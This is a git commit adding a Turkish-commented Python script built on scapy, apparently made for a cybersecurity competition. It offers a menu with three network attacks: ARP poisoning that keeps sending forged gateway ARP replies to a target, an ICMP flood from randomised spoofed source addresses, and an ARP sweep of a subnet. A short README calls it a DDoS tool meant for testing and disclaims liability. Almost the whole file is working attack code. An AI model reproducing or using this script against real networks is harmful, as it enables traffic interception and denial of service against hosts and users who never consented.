7dcf662141ea9a50f66b5dd0e97c53e231e1be91
Sami Esci <samiesci2@gmail.com>
2021-12-01 19:02:02 +0300

    DDOS-ATTACK

---
+++ DDoS-Attack.py
@@ -0,0 +1,66 @@
+from scapy.layers.inet import *
+from scapy.layers.l2 import *
+def main(): 
+    print("Esci- Nmap Tool")
+    print("Siber Güvenlik Yarışması")
+    print("Seçenekler")
+    print("""
+    1- Arp Poisoning
+    2- ICMP Flood
+    3- Arp Scanner(use with Wireshark)
+    99- Menü dönüş
+    """)
+    choose = int(input("Seçiminiz: "))
+    if(choose==1):
+        arp_poisoning()
+    elif(choose==2):
+        icmp_flood()
+    elif(choose==3):
+        arpscanner()
+    elif(choose==99):
+        main()
+
+#ARP POISONING FONKSIYONU
+def arp_poisoning():
+    print("""ARP POISONING""")
+    print(" ")
+    hedefIP = input('Hedef IP Gir: ')
+    modemIP = input('Modem IP Gir: ')
+
+    while True:
+        time.sleep(1)
+        sendp(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(psrc=modemIP, pdst=hedefIP))
+
+#ICMP FLOOD FONKSIYONU
+def icmp_flood():
+    print("""ICMP FLOODING""")
+    print(" ")
+    ipPacket = IP()
+    icmpPacket = ICMP()
+    hedefIP = input('Hedef IP Gir: ')
+    ipPacket.dst = hedefIP
+
+    packetsayisi= input('Kaç paket yollanacak: ')
+    for paket in range(1, int(packetsayisi)):
+        sourceIP = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+        ipPacket.src = sourceIP
+        send(ipPacket / icmpPacket)
+        print('Paket', paket, 'yollandı.')
+
+#ARP SCANNER FONKSIYONU
+def arpscanner():
+    print("""ARP SCANNER""")
+    print(" ")
+    print("Program arp paketleri yollar. Wireshark'tan inceleme yaparak scan sonucunu izleyebilirsiniz")
+    input("Başlamak için Enter basınız")
+    arpPaket = ARP()
+    networkID = input('Network ID: ')
+    IP = '.'.join(networkID.split(".")[i] for i in range(3)) + "."
+
+    for x in range(1, 255):
+        arpPaket.pdst = IP + str(x)
+        send(arpPaket)
+        print(IP+str(x)+" sent.")
+
+
+main()
---
+++ Readme.md
@@ -0,0 +1,3 @@
+DDOS ATTACK TOOL
+----------------
+Bu tool test amaçlı yapılmıştır. Aksi halde kullanımda sorumluluk sahibi olmadığımı temin ederim.
